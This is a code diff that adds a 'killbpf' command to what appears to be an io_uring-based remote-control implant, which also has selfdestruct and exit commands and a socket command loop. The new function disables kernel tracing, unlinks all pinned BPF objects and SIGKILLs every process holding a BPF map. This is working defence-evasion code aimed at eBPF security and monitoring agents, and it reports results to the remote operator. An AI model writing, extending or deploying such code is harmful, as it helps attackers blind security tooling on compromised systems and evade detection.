@@ -506,6 +506,130 @@ void cmd_exit(struct io_uring *ring, int sockfd) {
     _exit(0);
 }
 
+/*
+This cmd_killbpf version maximizes io_uring usage:
+
+- All open/close operations are now async (openat/close via io_uring)
+- Writes and unlinkat are async
+- Directory iteration (opendir/readdir) and kill() remain traditional calls,
+  since io_uring does not support directory enumeration or signal delivery yet.
+*/
+
+void cmd_killbpf(struct io_uring *ring, int sockfd) {
+    char out[8192];
+    size_t out_pos = 0;
+    int killed_count = 0;
+
+    const char *tracing_disable_files[] = {
+        "/sys/kernel/debug/tracing/tracing_on",
+        "/sys/kernel/debug/tracing/set_event",
+        "/sys/kernel/debug/tracing/current_tracer"
+    };
+
+    for (int i = 0; i < sizeof(tracing_disable_files)/sizeof(tracing_disable_files[0]); i++) {
+        const char *path = tracing_disable_files[i];
+
+        struct io_uring_sqe *sqe;
+        struct io_uring_cqe *cqe;
+        int fd;
+
+        sqe = io_uring_get_sqe(ring);
+        io_uring_prep_openat(sqe, AT_FDCWD, path, O_WRONLY, 0);
+        io_uring_submit(ring);
+        io_uring_wait_cqe(ring, &cqe);
+        fd = cqe->res;
+        io_uring_cqe_seen(ring, cqe);
+
+        if (fd < 0) continue;
+
+        sqe = io_uring_get_sqe(ring);
+        io_uring_prep_write(sqe, fd, "0", 1, 0);
+        io_uring_submit(ring);
+        io_uring_wait_cqe(ring, &cqe);
+        io_uring_cqe_seen(ring, cqe);
+
+        sqe = io_uring_get_sqe(ring);
+        io_uring_prep_close(sqe, fd);
+        io_uring_submit(ring);
+        io_uring_wait_cqe(ring, &cqe);
+        io_uring_cqe_seen(ring, cqe);
+
+        out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
+                            "[*] Tracing disabled: %s\n", path);
+    }
+
+    DIR *bpf_dir = opendir("/sys/fs/bpf");
+    if (bpf_dir) {
+        struct dirent *entry;
+        while ((entry = readdir(bpf_dir))) {
+            if (entry->d_name[0] == '.') continue;
+
+            char fullpath[512];
+            snprintf(fullpath, sizeof(fullpath), "/sys/fs/bpf/%s", entry->d_name);
+
+            struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
+            struct io_uring_cqe *cqe;
+
+            io_uring_prep_unlinkat(sqe, AT_FDCWD, fullpath, 0);
+            io_uring_submit(ring);
+            io_uring_wait_cqe(ring, &cqe);
+
+            if (cqe->res == 0) {
+                out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
+                                    "[+] Deleted BPF file: %s\n", fullpath);
+            }
+            io_uring_cqe_seen(ring, cqe);
+        }
+        closedir(bpf_dir);
+    }
+
+    DIR *proc = opendir("/proc");
+    if (!proc) {
+        out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
+                            "[-] Failed to open /proc: %s\n", strerror(errno));
+        send_all(ring, sockfd, out, out_pos);
+        return;
+    }
+
+    struct dirent *entry;
+    while ((entry = readdir(proc))) {
+        if (!isdigit(entry->d_name[0])) continue;
+
+        char map_path[256];
+        snprintf(map_path, sizeof(map_path), "/proc/%s/maps", entry->d_name);
+
+        char map_buf[16384];
+        int ret = read_file_uring(ring, map_path, map_buf, sizeof(map_buf));
+        if (ret <= 0) continue;
+
+        if (strstr(map_buf, "anon_inode:bpf-map")) {
+            pid_t pid = atoi(entry->d_name);
+            if (pid > 1) {
+                if (kill(pid, SIGKILL) == 0) {
+                    killed_count++;
+                    out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
+                                        "[+] Killed PID using BPF: %d\n", pid);
+                } else {
+                    out_pos += snprintf(out + out_pos, sizeof(out) - out_pos,
+                                        "[-] Failed to kill PID %d: %s\n",
+                                        pid, strerror(errno));
+                }
+            }
+        }
+
+        if (out_pos > sizeof(out) - 256)
+            break;
+    }
+    closedir(proc);
+
+    if (killed_count == 0 && out_pos == 0) {
+        out_pos = snprintf(out, sizeof(out),
+                           "[*] No processes with BPF map found\n");
+    }
+
+    send_all(ring, sockfd, out, out_pos);
+}
+
 void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
     sanitize_cmd(cmd);
 
@@ -538,6 +662,9 @@ void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
     } else if (strncmp(cmd, "selfdestruct", 12) == 0) {
         cmd_selfdestruct(ring, sockfd);
 
+    } else if (strncmp(cmd, "killbpf", 7) == 0) {
+        cmd_killbpf(ring, sockfd);
+
     } else if (strncmp(cmd, "exit", 4) == 0) {
         cmd_exit(ring, sockfd);
 
@@ -545,6 +672,7 @@ void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
         send_all(ring, sockfd, "[*] 404 Command not found [*]\n", 29);
     }
 }
+
 
 
 int main(void)
